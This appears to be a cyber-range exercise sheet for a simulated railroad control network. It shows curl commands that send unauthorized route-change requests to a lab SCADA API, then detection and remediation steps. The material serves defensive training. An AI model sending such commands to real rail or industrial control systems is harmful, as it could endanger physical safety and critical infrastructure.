# Scenario 1: Unauthorized Track Switching

## Objective
Detect unauthorized route change commands sent from outside the trusted zone.

## Difficulty: Medium | Duration: 20 minutes

## Attack Steps

```bash
# 1. Attacker sends unauthorized route command from DMZ
docker exec railroad-dmz-pentest curl -X POST \
  http://172.25.0.20:8080/api/command \
  -H "Content-Type: application/json" \
  -d '{"segment_id": 1, "route": "ROUTE_B"}'

# 2. Multiple rapid attempts (reconnaissance pattern)
for i in $(seq 1 5); do
  docker exec railroad-dmz-pentest curl -X POST \
    http://172.25.0.20:8080/api/command \
    -H "Content-Type: application/json" \
    -d '{"segment_id": 1, "route": "ROUTE_A"}'
done

# 3. Check audit logs
docker logs railroad-collector | grep REJECTED
docker logs railroad-master-plc | grep REJECTED
```

## Detection
- Check Kibana for rejected commands from unauthorized IPs
- Look for high-frequency command patterns
- Review syslog audit trail

## Remediation
- Implement stronger authentication on SCADA API
- Add rate limiting
- Enable command signing
- Restrict source IPs via firewall
